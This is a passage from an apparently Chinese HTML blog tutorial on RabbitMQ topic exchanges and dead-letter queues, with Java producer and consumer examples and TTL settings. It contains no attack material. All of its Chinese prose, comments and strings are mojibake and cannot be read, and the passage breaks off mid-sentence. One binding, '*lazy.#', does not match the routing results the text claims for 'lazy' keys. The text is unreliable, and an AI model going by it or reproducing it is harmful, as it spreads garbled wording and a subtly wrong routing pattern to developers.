/></p><p>æ•°æ®æ¥æ”¶æƒ…å†µå¦‚ä¸‹ï¼š</p><ol><li>quick.orange.rabbitï¼šè¢«é˜Ÿåˆ—Q1Q2æ¥æ”¶åˆ°</li><li>quick.orange.foxï¼šè¢«é˜Ÿåˆ—Q1æ¥æ”¶åˆ°</li><li>lazy.brown.foxï¼šè¢«é˜Ÿåˆ—Q2æ¥æ”¶åˆ°</li><li>lazy.pink.rabbitï¼šè™½ç„¶æ»¡è¶³é˜Ÿåˆ—Q2çš„ä¸¤ä¸ªç»‘å®šä½†æ˜¯åªä¼šè¢«æ¥æ”¶ä¸€æ¬¡</li><li>quick.orange.male.rabbitï¼šå››ä¸ªå•è¯ä¸åŒ¹é…ä»»ä½•ç»‘å®šä¼šè¢«ä¸¢å¼ƒ</li></ol><blockquote><p>ç»“è®º</p></blockquote><ol><li>å½“ä¸€ä¸ªé˜Ÿåˆ—ç»‘å®šé”®æ˜¯<code>#</code>,é‚£ä¹ˆè¿™ä¸ªé˜Ÿåˆ—å°†æ¥æ”¶æ‰€æœ‰æ•°æ®ï¼Œå°±æœ‰ç‚¹åƒfanoutäº†</li><li>å¦‚æœé˜Ÿåˆ—ç»‘å®šé”®å½“ä¸­æ²¡æœ‰<code>#å’Œ*</code>å‡ºç°ï¼Œé‚£ä¹ˆè¯¥é˜Ÿåˆ—ç»‘å®šç±»å‹å°±æ˜¯directäº†</li></ol><blockquote><p>å®æˆ˜</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112194418126.png" alt="image-20230112194418126" /></p><ol><li><p>ç”Ÿäº§è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmitLogTopic</span> &#123;<br>    <span class="hljs-comment">//äº¤æ¢æœºçš„åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;topic_logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>  <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br><br>        HashMap&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;quick.orange.rabbit&quot;</span>,<span class="hljs-string">&quot;è¢«é˜Ÿåˆ—Q1Q2æ¥æ”¶åˆ°&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;quick.orange.fox&quot;</span>,<span class="hljs-string">&quot;è¢«é˜Ÿåˆ—Q1æ¥æ”¶åˆ°&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;lazy.brown.fox&quot;</span>,<span class="hljs-string">&quot;è¢«é˜Ÿåˆ—Q2æ¥æ”¶åˆ° &quot;</span>);<br>        map.put(<span class="hljs-string">&quot;lazy.pink.rabbit&quot;</span>,<span class="hljs-string">&quot;è™½ç„¶æ»¡è¶³é˜Ÿåˆ—Q2çš„ä¸¤ä¸ªç»‘å®šä½†æ˜¯åªä¼šè¢«æ¥æ”¶ä¸€æ¬¡&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;quick.orange.male.rabbit&quot;</span>,<span class="hljs-string">&quot;å››ä¸ªå•è¯ä¸åŒ¹é…ä»»ä½•ç»‘å®šä¼šè¢«ä¸¢å¼ƒ&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, String&gt; bindingKeyEntry : map.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">routingKey</span> <span class="hljs-operator">=</span> bindingKeyEntry.getKey();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> bindingKeyEntry.getValue();<br><br>            channel.basicPublish(EXCHANGE_NAME,routingKey,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>            System.out.println(<span class="hljs-string">&quot;ç”Ÿäº§è€…å‘é€æ¶ˆæ¯ï¼š&quot;</span>+ message );<br><br>        &#125;<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ¶ˆè´¹è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* å£°æ˜ä¸»é¢˜äº¤æ¢æœºåŠç›¸å…³é˜Ÿåˆ—</span><br><span class="hljs-comment">* æ¶ˆè´¹è€…C1</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReceiveLogsTopic01</span> &#123;<br>    <span class="hljs-comment">//äº¤æ¢æœºåç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;topic_logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>  <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//å£°æ˜äº¤æ¢æœº</span><br>        channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.TOPIC);<br><br>        <span class="hljs-comment">//å£°æ˜é˜Ÿåˆ—</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Q1&quot;</span>;<br>        channel.queueDeclare(queueName,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//é˜Ÿåˆ—æ†ç»‘</span><br>        channel.queueBind(queueName,EXCHANGE_NAME,<span class="hljs-string">&quot;*.orange.*&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;ç­‰å¾…æ¥æ”¶æ¶ˆæ¯......&quot;</span>);<br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>            System.out.println(<span class="hljs-string">&quot;æ¥æ”¶é˜Ÿåˆ—ï¼š&quot;</span>+ queueName + <span class="hljs-string">&quot;ç»‘å®šé”®ï¼š&quot;</span> + message.getEnvelope().getRoutingKey());<br>        &#125;;<br><br>        <span class="hljs-comment">//æ¥æ”¶æ¶ˆæ¯</span><br>        channel.basicConsume(queueName,<span class="hljs-literal">true</span>,deliverCallback,consumerTag -&gt; &#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* å£°æ˜ä¸»é¢˜äº¤æ¢æœºåŠç›¸å…³é˜Ÿåˆ—</span><br><span class="hljs-comment">* æ¶ˆè´¹è€…C2</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReceiveLogsTopic02</span> &#123;<br>    <span class="hljs-comment">//äº¤æ¢æœºåç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;topic_logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>  <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//å£°æ˜äº¤æ¢æœº</span><br>        channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.TOPIC);<br><br>        <span class="hljs-comment">//å£°æ˜é˜Ÿåˆ—</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Q2&quot;</span>;<br>        channel.queueDeclare(queueName,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//é˜Ÿåˆ—æ†ç»‘</span><br>        channel.queueBind(queueName,EXCHANGE_NAME,<span class="hljs-string">&quot;*.*.rabbit&quot;</span>);<br>        channel.queueBind(queueName,EXCHANGE_NAME,<span class="hljs-string">&quot;*lazy.#&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;ç­‰å¾…æ¥æ”¶æ¶ˆæ¯......&quot;</span>);<br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>            System.out.println(<span class="hljs-string">&quot;æ¥æ”¶é˜Ÿåˆ—ï¼š&quot;</span>+ queueName + <span class="hljs-string">&quot;ç»‘å®šé”®ï¼š&quot;</span> + message.getEnvelope().getRoutingKey());<br>        &#125;;<br><br>        <span class="hljs-comment">//æ¥æ”¶æ¶ˆæ¯</span><br>        channel.basicConsume(queueName,<span class="hljs-literal">true</span>,deliverCallback,consumerTag -&gt; &#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>ç»“æœ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112194456980.png" alt="image-20230112194456980" /></p><p>â€‹</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112194512817.png" alt="image-20230112194512817" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112194521794.png" alt="image-20230112194521794" /></p><h1 id="7-æ­»ä¿¡é˜Ÿåˆ—"><a class="markdownIt-Anchor" href="#7-æ­»ä¿¡é˜Ÿåˆ—"></a> 7. æ­»ä¿¡é˜Ÿåˆ—</h1><blockquote><p>æ¦‚å¿µ</p></blockquote><ol><li>æ­»ä¿¡ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯æ— æ³•è¢«æ¶ˆè´¹çš„æ¶ˆæ¯ï¼Œå­—é¢æ„æ€å¯ä»¥è¿™æ ·ç†è§£ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œproducerå°†æ¶ˆæ¯æŠ•é€’åˆ° brokeræˆ–è€…ç›´æ¥åˆ°queueé‡Œäº†,consumer ä» queueå–å‡ºæ¶ˆæ¯è¿›è¡Œæ¶ˆè´¹ï¼Œ<code>ä½†æŸäº›æ—¶å€™ç”±äºç‰¹å®šçš„åŸå› å¯¼è‡´queueä¸­çš„æŸäº›æ¶ˆæ¯æ— æ³•è¢«æ¶ˆè´¹</code>ï¼Œè¿™æ ·çš„æ¶ˆæ¯å¦‚æœæ²¡æœ‰åç»­çš„å¤„ç†ï¼Œå°±å˜æˆäº†æ­»ä¿¡ï¼Œæœ‰æ­»ä¿¡è‡ªç„¶å°±æœ‰äº†æ­»ä¿¡é˜Ÿåˆ—ã€‚</li><li>åº”ç”¨åœºæ™¯ï¼šä¸ºäº†ä¿è¯è®¢å•ä¸šåŠ¡çš„æ¶ˆæ¯æ•°æ®ä¸ä¸¢å¤±ï¼Œéœ€è¦ä½¿ç”¨åˆ°RabbitMQçš„æ­»ä¿¡é˜Ÿåˆ—æœºåˆ¶ï¼Œå½“æ¶ˆæ¯æ¶ˆè´¹å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œå°†æ¶ˆæ¯æŠ•å…¥æ­»ä¿¡é˜Ÿåˆ—ä¸­.è¿˜æœ‰æ¯”å¦‚è¯´:ç”¨æˆ·åœ¨å•†åŸä¸‹å•æˆåŠŸå¹¶ç‚¹å‡»å»æ”¯ä»˜ååœ¨æŒ‡å®šæ—¶é—´æœªæ”¯ä»˜æ—¶è‡ªåŠ¨å¤±æ•ˆ</li></ol><blockquote><p>æ¥æº</p></blockquote><ol><li>æ¶ˆæ¯TTLè¿‡æœŸ</li><li>é˜Ÿåˆ—è¾¾åˆ°æœ€å¤§é•¿åº¦ï¼ˆé˜Ÿåˆ—æ»¡äº†ï¼Œæ— æ³•å†æ·»åŠ æ•°æ®åˆ°mqä¸­ï¼‰</li><li>æ¶ˆæ¯è¢«æ‹’ç»ï¼ˆbasic.rejectæˆ–basic.nackï¼‰å¹¶ä¸”requeue=false</li></ol><blockquote><p>ä»£ç æ¶æ„å›¾</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112194651527.png" alt="image-20230112194651527" /></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>è¿‡æœŸæ—¶é—´<br>arguments.put(<span class="hljs-string">&quot;x-message-ttl&quot;</span>,<span class="hljs-number">1000</span>);<br><span class="hljs-regexp">//</span>æ­£å¸¸é˜Ÿåˆ—è®¾ç½®æ­»ä¿¡é˜Ÿåˆ—<br>arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>,DEAD_EXCHANGE);<br><span class="hljs-regexp">//</span>è®¾ç½®æ­»ä¿¡RoutingKey<br>arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>,<span class="hljs-string">&quot;lisi&quot;</span>);<br></code></pre></td></tr></table></figure><p><mark><code>key</code>æ˜¯å›ºå®šçš„</mark></p><blockquote><p>æ¶ˆæ¯TTLè¿‡æœŸ</p></blockquote><ol><li><p>ç”Ÿäº§è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* æ­»ä¿¡é˜Ÿåˆ—ä¹‹ç”Ÿäº§è€…ä»£ç </span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Producer</span> &#123;<br><br>    <span class="hljs-comment">//æ™®é€šäº¤æ¢æœºçš„åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NORMAL_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;normal_exchange&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//æ­»ä¿¡æ¶ˆæ¯ï¼Œè®¾ç½®TTLæ—¶é—´  å•ä½æ˜¯ms  10000msæ˜¯10s</span><br>        AMQP.<span class="hljs-type">BasicProperties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMQP</span>.BasicProperties().builder().expiration(<span class="hljs-string">&quot;10000&quot;</span>).build();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;info&quot;</span> + i;<br>            channel.basicPublish(NORMAL_EXCHANGE,<span class="hljs-string">&quot;zhangsan&quot;</span>,properties,message.getBytes(StandardCharsets.UTF_8));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ¶ˆè´¹è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* æ­»ä¿¡é˜Ÿåˆ—å®æˆ˜</span><br><span class="hljs-comment">* æ¶ˆè´¹è€…01</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Consumer01</span> &#123;<br><br>    <span class="hljs-comment">//æ™®é€šäº¤æ¢æœºåç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NORMAL_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;normal_exchange&quot;</span>;<br><br>    <span class="hljs-comment">//æ­»ä¿¡äº¤æ¢æœºåç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dead_exchange&quot;</span>;<br><br>    <span class="hljs-comment">//æ™®é€šé˜Ÿåˆ—åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NORMAL_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;normal_queue&quot;</span>;<br><br>    <span class="hljs-comment">//æ­»ä¿¡é˜Ÿåˆ—åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dead_queue&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//å£°æ˜æ­»ä¿¡å’Œæ™®é€šçš„äº¤æ¢æœºç±»å‹ä¸ºdirect</span><br>        channel.exchangeDeclare(NORMAL_EXCHANGE, BuiltinExchangeType.DIRECT);<br>        channel.exchangeDeclare(DEAD_EXCHANGE, BuiltinExchangeType.DIRECT);<br><br>        <span class="hljs-comment">//å£°æ˜æ™®é€šé˜Ÿåˆ—</span><br>        HashMap&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">//è¿‡æœŸæ—¶é—´</span><br>        arguments.put(<span class="hljs-string">&quot;x-message-ttl&quot;</span>,<span class="hljs-number">10000</span>);<br>        <span class="hljs-comment">//æ­£å¸¸é˜Ÿåˆ—è®¾ç½®æ­»ä¿¡é˜Ÿåˆ—</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>,DEAD_EXCHANGE);<br>        <span class="hljs-comment">//è®¾ç½®æ­»ä¿¡RoutingKey</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>,<span class="hljs-string">&quot;lisi&quot;</span>);<br><br>        <span class="hljs-comment">//å£°æ˜æ­»ä¿¡å’Œæ™®é€šé˜Ÿåˆ—</span><br>        channel.queueDeclare(NORMAL_QUEUE,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,arguments);<br>        channel.queueDeclare(DEAD_QUEUE,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//ç»‘å®šæ™®é€šçš„äº¤æ¢æœºä¸æ™®é€šçš„é˜Ÿåˆ—</span><br>        channel.queueBind(NORMAL_QUEUE,NORMAL_EXCHANGE,<span class="hljs-string">&quot;zhangsan&quot;</span>);<br>        <span class="hljs-comment">//ç»‘å®šæ­»ä¿¡çš„äº¤æ¢æœºä¸æ­»ä¿¡çš„é˜Ÿåˆ—</span><br>        channel.queueBind(DEAD_QUEUE,DEAD_EXCHANGE,<span class="hljs-string">&quot;lisi&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;ç­‰å¾…æ¥æ”¶æ¶ˆæ¯......&quot;</span>);<br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;Consumer01æ¥æ”¶çš„æ¶ˆæ¯æ˜¯ï¼š&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br><br>        channel.basicConsume(NORMAL_QUEUE,<span class="hljs-literal">true</span>,deliverCallback,consumerTag-&gt;&#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* æ­»ä¿¡é˜Ÿåˆ—å®æˆ˜</span><br><span class="hljs-comment">* æ¶ˆè´¹è€…02</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Consumer02</span> &#123;<br><br>    <span class="hljs-comment">//æ­»ä¿¡é˜Ÿåˆ—åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dead_queue&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        System.out.println(<span class="hljs-string">&quot;ç­‰å¾…æ¥æ”¶æ¶ˆæ¯......&quot;</span>);<br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;Consumer02æ¥æ”¶çš„æ¶ˆæ¯æ˜¯ï¼š&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br><br>        channel.basicConsume(DEAD_QUEUE,<span class="hljs-literal">true</span>,deliverCallback,consumerTag-&gt;&#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ•ˆæœï¼šå¯åŠ¨ç”Ÿäº§è€…åï¼Œ10æ¡æ¶ˆæ¯è¢«ä¼ é€åˆ°NORMAL_QUEUEï¼Œç„¶åè¢«ä¼ é€åˆ°DEAD_QUEUEï¼Œæ­¤æ—¶å¯åŠ¨æ¶ˆè´¹è€…02ï¼Œæ¶ˆæ¯å…¨è¢«æ¥æ”¶ã€‚</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112210007005.png" alt="image-20230112210007005" /></p><p><strong>ä»¥ä¸Šæ­¥éª¤å®Œæˆå å¯åŠ¨ C2 æ¶ˆè´¹è€… å®ƒæ¶ˆè´¹æ­»ä¿¡é˜Ÿåˆ—é‡Œé¢çš„æ¶ˆæ¯</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112210827202.png" alt="image-20230112210827202" /></p><p>4.æ€»ç»“</p><ol><li><p>åœ¨æ¶ˆè´¹è€…è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œå¯å¯¹æ•´ä¸ªé˜Ÿåˆ—çš„æ¶ˆæ¯è®¾ç½®è¿‡æœŸæ—¶é—´</p></li><li><p>åœ¨ç”Ÿæˆè€…è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œå¯å¯¹ä¸åŒçš„æ¶ˆæ¯è®¾ç½®ä¸åŒçš„è¿‡æœŸæ—¶é—´ï¼Œè‡ªç”±åº¦é«˜ã€‚ç”¨è¯¥æ–¹å¼ä¹Ÿæ¯”è¾ƒå¤šã€‚</p></li><li><p>ä¸¤è€…åŒæ—¶è®¾ç½®ä»¥æ¶ˆè´¹è€…ä¸ºå‡†ã€‚ï¼ˆç™¾åº¦å‡ºæ¥åˆä¸æ˜¯è¿™æ 